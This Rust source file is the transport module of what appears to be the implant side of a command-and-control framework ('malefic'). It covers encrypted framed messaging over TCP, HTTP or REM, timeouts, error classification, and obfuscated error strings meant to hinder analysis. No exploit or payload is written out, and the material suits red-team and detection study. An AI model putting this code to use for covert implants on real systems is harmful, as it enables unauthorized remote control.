#[cfg(feature = "tcp")]
pub mod tcp;
#[cfg(feature = "transport_http")]
pub mod http;
#[cfg(feature = "transport_rem")]
pub mod rem;

#[cfg(feature = "proxy")]
pub mod proxie;

pub mod server_manager;

use anyhow::Result;
use async_trait::async_trait;
use futures::lock::Mutex;
use futures::{join, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt, FutureExt};
use futures_timer::Delay;
use malefic_helper::debug;
use malefic_proto::crypto::{Cryptor, CryptorError};
use malefic_proto::{parser_header, SpiteData, HEADER_LEN};
use std::io;
use std::pin::Pin;
use std::sync::Arc;
use std::time::Duration;
use thiserror::Error;

cfg_if::cfg_if! {
    if #[cfg(feature = "transport_tcp")] {
        pub use tcp::TCPTransport as InnterTransport;
        pub use tcp::TCPClient as Client;
    } else if #[cfg(feature = "transport_http")] {
        pub use http::HTTPTransport as InnterTransport;
        pub use http::HTTPClient as Client;
    } else if #[cfg(feature = "transport_rem")] {
        pub use rem::REMTransport as InnterTransport;
        pub use rem::REMClient as Client;
    } else {
        compile_error!("No transport selected");
    }
}

#[async_trait]
pub trait TransportImpl: AsyncRead + AsyncWrite + Unpin + Send  {}

impl<T> TransportImpl for T where T: AsyncRead + AsyncWrite + Unpin + Send  {}


#[async_trait]
pub trait ListenerExt: Sized {
    async fn bind(addr: &str) -> anyhow::Result<Self>;
    async fn accept(&mut self) -> anyhow::Result<impl TransportImpl>;
}

#[async_trait]
pub trait DialerExt {
    async fn connect(&mut self, config: &ServerConfig) -> anyhow::Result<impl TransportImpl>;
}



#[cfg(feature = "bind")]
cfg_if::cfg_if! {
    if #[cfg(feature = "transport_tcp")] {
        pub use tcp::TCPListenerExt as Listener;
    } else {
        compile_error!("No transport selected");
    }
}

#[derive(Error, Debug)]
pub enum TransportError {
    #[error(transparent)]
    AnyHowError(#[from] anyhow::Error),

    #[error("Failed to connect to the server")]
    ConnectionError,

    #[error("Configuration error")]
    ConfigurationError,

    #[error("Failed to encrypt/decrypt data")]
    CryptorError(#[from] CryptorError),

    #[error("Failed to send data")]
    SendError,

    #[error("Failed to send data within the timeout")]
    SendTimeout,

    #[error("Deadline")]
    Deadline,

    #[error("Connection refused")]
    ConnectionRefused,

    #[error("Connection reset")]
    ConnectionReset,

    #[error("Connection aborted")]
    ConnectionAborted,

    #[error("Network unreachable")]
    NetworkUnreachable,

    #[error("Other network error: {0}")]
    NetworkError(String),

    #[error("Failed to receive data")]
    RecvError,

    #[error("I/O Error: {0}")]
    IoError(#[from] io::Error), // 转换标准库的 I/O 错误

    #[error("Parser error: {0}")]
    ParserError(#[from] malefic_proto::ParserError),

    #[error("Unexpected end of stream")]
    UnexpectedEof,

    #[error("Unknown error occurred")]
    UnknownError,
}

impl TransportError {
    // 辅助方法：从 anyhow::Error 分类错误
    pub fn from_network_error(error: anyhow::Error) -> Self {
        let error_msg = format!("{:?}", error);

        if error_msg.contains(obfstr::obfstr!("os error 10061")) ||
            error_msg.contains(obfstr::obfstr!("ConnectionRefused")) {
            TransportError::ConnectionRefused
        } else if error_msg.contains("os error 10054") ||
            error_msg.contains("Connection reset") {
            TransportError::ConnectionReset
        } else if error_msg.contains("os error 10053") ||
            error_msg.contains("Connection aborted") {
            TransportError::ConnectionAborted
        } else if error_msg.contains("Network unreachable") {
            TransportError::NetworkUnreachable
        } else {
            TransportError::NetworkError(error_msg)
        }
    }

    pub fn from_io_error(error: &std::io::Error) -> Self {
        match error.kind() {
            std::io::ErrorKind::ConnectionRefused => TransportError::ConnectionRefused,
            std::io::ErrorKind::ConnectionReset => TransportError::ConnectionReset,
            std::io::ErrorKind::ConnectionAborted => TransportError::ConnectionAborted,
            std::io::ErrorKind::NetworkUnreachable => TransportError::NetworkUnreachable,
            _ => TransportError::NetworkError(format!("IO Error: {}", error))
        }
    }

    // 辅助方法：判断是否是连接问题
    pub fn is_connection_error(&self) -> bool {
        matches!(self,
            TransportError::ConnectionRefused |
            TransportError::ConnectionReset |
            TransportError::ConnectionAborted |
            TransportError::NetworkUnreachable
        )
    }

}

impl From<&TransportError> for io::Error {
    fn from(transport_error: &TransportError) -> Self {
        match transport_error {
            TransportError::ConnectionRefused => {
                io::Error::new(io::ErrorKind::ConnectionRefused, "Connection refused")
            }
            TransportError::ConnectionReset => {
                io::Error::new(io::ErrorKind::ConnectionReset, "Connection reset")
            }
            TransportError::ConnectionAborted => {
                io::Error::new(io::ErrorKind::ConnectionAborted, "Connection aborted")
            }
            TransportError::NetworkUnreachable => {
                io::Error::new(io::ErrorKind::NetworkUnreachable, "Network unreachable")
            }
            TransportError::ConnectionError => {
                io::Error::new(io::ErrorKind::ConnectionRefused, "Connection failed")
            }
            _ => io::Error::new(io::ErrorKind::Other, format!("{}", transport_error))
        }
    }
}

pub struct Transport {
    pub inner: InnterTransport,
    pub write_lock: Arc<Mutex<bool>>,
    pub read_lock: Arc<Mutex<bool>>,
}

// 传输层读取半部
pub struct TransportReadHalf {
    reader: Pin<Box<dyn AsyncRead + Send + Sync>>,
    read_lock: Arc<Mutex<bool>>,
}

// 传输层写入半部
pub struct TransportWriteHalf {
    writer: Pin<Box<dyn AsyncWrite + Send + Sync>>,
    write_lock: Arc<Mutex<bool>>,
}

impl Transport {
    pub fn new(transport: InnterTransport) -> Self {
        Transport {
            inner: transport,
            write_lock: Arc::new(Mutex::new(false)),
            read_lock: Arc::new(Mutex::new(false)),
        }
    }

    pub fn split(self) -> (TransportReadHalf, TransportWriteHalf) {
        let (reader, writer) = self.inner.split();
        let read_half = TransportReadHalf {
            reader: Box::pin(reader),
            read_lock: self.read_lock.clone(),
        };
        let write_half = TransportWriteHalf {
            writer: Box::pin(writer),
            write_lock: self.write_lock,
        };
        (read_half, write_half)
    }

    pub async fn write_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.write_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            Delay::new(Duration::from_millis(10)).await;
        }
    }

    pub async fn write_over(&self) {
        let mut lock = self.write_lock.lock().await;
        *lock = true;
    }

    pub async fn read_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.read_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            Delay::new(Duration::from_millis(10)).await;
        }
    }

    pub async fn read_over(&self) {
        let mut lock = self.read_lock.lock().await;
        *lock = true;
    }
}

impl TransportReadHalf {
    async fn read_over(&self) {
        let mut lock = self.read_lock.lock().await;
        *lock = true;
    }

    pub async fn read(&mut self, len: usize) -> Result<Vec<u8>> {
        let mut result = vec![0u8; len];
        let mut total_read = 0;

        while total_read < len {
            let remaining = len - total_read;
            let chunk_size = remaining.min(8192);
            let n = self.reader.read(&mut result[total_read..total_read + chunk_size]).await?;
            if n == 0 {
                // 连接关闭或没有更多数据
                break;
            }
            total_read += n;
        }

        result.truncate(total_read);
        Ok(result)
    }
}

impl TransportWriteHalf {
    async fn write_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.write_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            Delay::new(Duration::from_millis(10)).await;
        }
    }

    async fn write_over(&self) {
        let mut lock = self.write_lock.lock().await;
        *lock = true;
    }

    pub async fn write(&mut self, data: &[u8]) -> Result<usize> {
        debug!("[transport] write start");
        match self.writer.write_all(data).await {
            Ok(()) => Ok(data.len()),
            Err(e) => {
                // 这里应该能捕获到真正的网络错误
                debug!("[transport] write_all failed: {:?}", e);
                Err(TransportError::IoError(e).into())
            }
        }
    }

    pub async fn flush(&mut self) -> Result<()> {
        self.writer.flush().await?;
        Ok(())
    }
}



#[derive(Clone)]
pub struct Stream {
    pub cryptor: Cryptor,
}

impl Stream {
    pub async fn write(&mut self, writer: &mut TransportWriteHalf, data: &[u8]) -> Result<usize> {
        let encrypted_data = self.cryptor.encrypt(data.to_vec())?;
        writer.write(&encrypted_data).await
    }

    pub async fn read(&mut self, reader: &mut TransportReadHalf, len: usize) -> Result<Vec<u8>> {
        let data = reader.read(len).await?;
        debug!("[stream] read expect:{} actual:{}", len, data.len());
        if data.len() != len {
            return Err(TransportError::RecvError.into());
        }
        Ok(self.cryptor.decrypt(data)?)
    }

    pub fn reset(&mut self) {
        self.cryptor.reset();
    }
}



impl Client {

    pub async fn handler(
        &mut self,
        transport: InnterTransport,
        data: SpiteData,
    ) -> Result<Option<SpiteData>> {
        self.stream.cryptor.reset();

        let mut sender = self.clone();
        let mut receiver = self.clone();

        let (mut reader, mut writer) = Transport::new(transport).split();
        
        futures::select! {
            result = async {
                let send_task = sender.write(&mut writer, data).fuse();
                let recv_task = receiver.read(&mut reader).fuse();
                let (recv_result, send_result) = join!(recv_task, send_task);

                // 关闭连接
                let _ = writer.writer.close().await;

                if let Err(e) = send_result {
                    debug!("[client] send error: {:?}", e);
                    return Err(e.into());
                }
                debug!("[client] send success {:?}",send_result);

                match recv_result {
                    Ok(data) => Ok(Some(data)),
                    Err(e) => {
                        debug!("[client] recv error: {:?}", e);
                        if let Some(io_error) = e.downcast_ref::<std::io::Error>() {
                              let transport_error = TransportError::from_io_error(io_error);
                              if transport_error.is_connection_error() {
                                  debug!("[client] Connection error, propagating");
                                  return Err(e);
                              }
                        }
                        Ok(None)
                    }
                }
            }.fuse() => result,
            _ = Delay::new(Duration::from_secs(10)).fuse() => {
                debug!("[client] handler timeout after 10 seconds");
                // 尝试关闭连接
                let _ = writer.writer.close().await;
                Err(TransportError::Deadline.into())
            }
        }
    }

    pub async fn send(&mut self, transport: InnterTransport, data: SpiteData) -> Result<()> {
        let (_, mut writer) = Transport::new(transport).split();
        futures::select! {
            result = async {
                self.write(&mut writer, data).await
            }.fuse() => result,
            _ = Delay::new(Duration::from_secs(2)).fuse() => {
                Err(TransportError::SendTimeout.into())
            }
        }
    }

    pub async fn write(&mut self, writer: &mut TransportWriteHalf, data: SpiteData) -> Result<()> {
        futures::select! {
            result = async {
                let header = data.header();
                match self.stream.write(writer, &header).await {
                    Ok(n) => {
                        if n != header.len() {
                            return Err(TransportError::SendError.into());
                        }
                        debug!("[task send] send header success");
                    }
                    Err(e) => {
                        let transport_error = TransportError::from_network_error(e);
                        debug!("[task send] Header write error: {:?}", transport_error);
                        return Err(transport_error.into());
                    }
                }

                let body = data.body();
                match self.stream.write(writer, &body).await {
                    Ok(n) => {
                        if n != body.len() {
                            return Err(TransportError::SendError.into());
                        }
                    }
                    Err(e) => {
                        let transport_error = TransportError::from_network_error(e);
                        debug!("[task send] Body write error: {:?}", transport_error);
                        return Err(transport_error.into());
                    }
                }
                debug!("[task send] send body success");
                writer.flush().await?;
                writer.write_over().await;
                debug!("[task send] send over");
                writer.write_wait().await
                .map_err(|_| TransportError::SendError)?;
                Ok(())
            }.fuse() => result,
            _ = Delay::new(Duration::from_secs(2)).fuse() => {
                Err(TransportError::SendTimeout.into())
            }
        }
    }

    pub async fn read(&mut self, reader: &mut TransportReadHalf) -> Result<SpiteData> {
        futures::select! {
            res = async {
                // 接收header
                let response_data = self.stream.read(reader, HEADER_LEN).await?;
                if response_data.len() != HEADER_LEN {
                    debug!("[task recv] recv header error: expect {} actual {}", HEADER_LEN, response_data.len());
                    return Err(TransportError::RecvError.into());
                }

                let mut spitedata = parser_header(&response_data)?;
                debug!("[task recv] recv header success: {:?}, length: {}", response_data, spitedata.length);

                // 接收body
                let data = self.stream.read(reader, spitedata.length as usize + 1).await?;
                spitedata.set_data(data)?;
                reader.read_over().await;
                debug!("[task recv] recv over");
                debug!("spitedata: {:?}", spitedata);
                Ok(spitedata)
            }.fuse() => {
                debug!("recv end");
                match res {
                    Ok(data) => Ok(data),
                    Err(e) => {
                        reader.read_over().await;
                        Err(e)
                    }
                }
            },
            _ = Delay::new(Duration::from_secs(5)).fuse() => {
                debug!("recv timeout");
                reader.read_over().await;
                Err(TransportError::Deadline.into())
            }
        }
    }
}

// 导出服务器管理相关类型
pub use server_manager::{ServerManager, ServerInfo, ServerStatus, ServerStats};
use crate::config::ServerConfig;
